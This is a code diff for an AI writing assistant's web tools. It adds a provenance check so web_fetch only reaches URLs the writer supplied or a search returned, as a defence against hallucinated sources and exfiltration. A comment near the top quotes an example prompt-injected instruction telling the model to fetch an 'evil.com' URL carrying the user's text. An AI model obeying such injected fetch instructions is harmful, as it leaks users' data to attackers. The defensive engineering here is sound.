@@ -150,6 +150,61 @@ export const makeSafeLookup = (rawLookup: RawLookup = dns.lookup as unknown as R
 
 const safeLookup = makeSafeLookup()
 
+// ---- URL provenance (Anthropic web_fetch pattern) --------------------------
+// web_fetch may only hit URLs the writer supplied or a search returned this
+// session — a constructed URL is both a hallucinated-source risk and a data
+// exfiltration channel (an injected page saying "fetch evil.com/?d=<canon>").
+// Enforced HERE, mechanically, because prompts can be talked out of.
+
+const MAX_KNOWN_URLS = 500
+const knownUrls = new Set<string>()
+
+/** Comparison form: case-normalized origin, no hash, query kept. */
+const normalizeUrl = (raw: string): string | null => {
+  try {
+    const url = new URL(raw)
+    url.hash = ''
+    return url.toString()
+  } catch {
+    return null
+  }
+}
+
+const rememberUrl = (raw: string): void => {
+  const normalized = normalizeUrl(raw)
+  if (!normalized) return
+  if (knownUrls.has(normalized)) return
+  if (knownUrls.size >= MAX_KNOWN_URLS) {
+    // FIFO trim: Sets iterate in insertion order.
+    const oldest = knownUrls.values().next().value
+    if (oldest) knownUrls.delete(oldest)
+  }
+  knownUrls.add(normalized)
+}
+
+/**
+ * Register every http(s) URL found in free text (writer messages) as
+ * fetchable. Called by LangGraphManager on each outgoing writer message.
+ */
+export const registerUrlProvenance = (text: string): void => {
+  if (!text) return
+  const urlRe = /https?:\/\/[^\s<>"'()[\]{}]+/gi
+  for (const match of text.matchAll(urlRe)) {
+    // Trailing sentence punctuation is prose, not URL.
+    rememberUrl(match[0].replace(/[.,;:!?]+$/, ''))
+  }
+}
+
+/** Conversation switch — a new thread starts with a clean slate. */
+export const clearUrlProvenance = (): void => {
+  knownUrls.clear()
+}
+
+const isKnownUrl = (raw: string): boolean => {
+  const normalized = normalizeUrl(raw)
+  return normalized !== null && knownUrls.has(normalized)
+}
+
 const decodeEntities = (text: string): string =>
   text
     .replace(/&amp;/g, '&')
@@ -190,10 +245,21 @@ const webFetch = async(
 ): Promise<unknown> => {
   let url = assertSafeUrl(str(args, 'url'))
 
+  // Provenance gate: only URLs the writer supplied or a search returned.
+  if (!isKnownUrl(url.toString())) {
+    throw new Error(
+      'This URL did not come from the writer or from a search result this session. ' +
+      'Use web_search or wiki_search first and fetch a URL it returned. ' +
+      '(Guessed URLs are how hallucinated sources — and data exfiltration — happen.)'
+    )
+  }
+
   // Redirects are followed MANUALLY so every hop goes back through the
   // guard — axios's own maxRedirects would happily follow a public page's
   // 302 into 169.254.169.254. Each connection also uses the DNS-pinned
-  // lookup, so validation and connection can never disagree.
+  // lookup, so validation and connection can never disagree. Redirect
+  // targets are server-chosen, so they are exempt from provenance but
+  // still pass assertSafeUrl.
   for (let hop = 0; hop <= MAX_REDIRECT_HOPS; hop++) {
     const response = await axios.get(url.toString(), {
       timeout: FETCH_TIMEOUT_MS,
@@ -214,6 +280,7 @@ const webFetch = async(
       // Relative Locations resolve against the current URL; the result is
       // re-guarded exactly like a writer-supplied URL.
       url = assertSafeUrl(new URL(location, url).toString())
+      rememberUrl(url.toString())
       continue
     }
 
@@ -285,6 +352,7 @@ const webSearch = async(
   })
 
   const results = parseDuckDuckGoHtml(String(response.data ?? '')).slice(0, maxResults)
+  for (const result of results) rememberUrl(result.url)
   return {
     query,
     results,
@@ -325,15 +393,17 @@ const wikiSearch = async(
   )
 
   const pages = Array.isArray(response.data?.pages) ? response.data.pages : []
+  const results = pages.map((p: Record<string, unknown>) => ({
+    title: String(p.title ?? ''),
+    description: String(p.description ?? ''),
+    excerpt: htmlToText(String(p.excerpt ?? '')).slice(0, 300),
+    url: `https://${lang}.wikipedia.org/wiki/${encodeURIComponent(String(p.key ?? p.title ?? ''))}`
+  }))
+  for (const result of results) rememberUrl(result.url)
   return {
     query,
     lang,
-    results: pages.map((p: Record<string, unknown>) => ({
-      title: String(p.title ?? ''),
-      description: String(p.description ?? ''),
-      excerpt: htmlToText(String(p.excerpt ?? '')).slice(0, 300),
-      url: `https://${lang}.wikipedia.org/wiki/${encodeURIComponent(String(p.key ?? p.title ?? ''))}`
-    }))
+    results
   }
 }
 
@@ -372,11 +442,13 @@ const wikiRead = async(
     }
   }
   const text = first.extract
+  const articleUrl = `https://${lang}.wikipedia.org/wiki/${encodeURIComponent(first.title ?? title)}`
+  rememberUrl(articleUrl)
   return {
     title: first.title ?? title,
     lang,
     found: true,
-    url: `https://${lang}.wikipedia.org/wiki/${encodeURIComponent(first.title ?? title)}`,
+    url: articleUrl,
     text: text.slice(0, MAX_TEXT_CHARS),
     truncated: text.length > MAX_TEXT_CHARS
   }
